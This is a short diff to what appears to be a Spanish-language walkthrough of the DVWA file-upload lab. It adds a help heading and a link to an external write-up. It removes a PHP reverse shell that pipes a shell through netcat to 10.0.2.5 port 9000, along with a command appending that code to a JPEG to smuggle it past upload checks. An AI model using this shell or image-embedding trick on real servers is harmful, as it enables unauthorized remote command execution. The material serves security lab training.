@@ -284,25 +284,13 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 ?>
 ```
 
-xxxxxxxxxxxxxxxxxxxx
+View Help:
 ```
 High Level: Once the file has been received from the client, the server will try to resize any image that was included in the request.
 
 Spoiler: need to link in another vulnerability, such as file inclusion.
 ```
 
-```
-nano reverse.php
---->
-<?php
-      passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 10.0.2.5 9000 > /tmp/f");
-?>
-```
-
-Inyectamos el código en una imagen:
-```
-cat reverse.php >> luna.jpg
-```
-
+https://wargame.braincoke.fr/labs/dvwa/dvwa-file-upload/
 
 
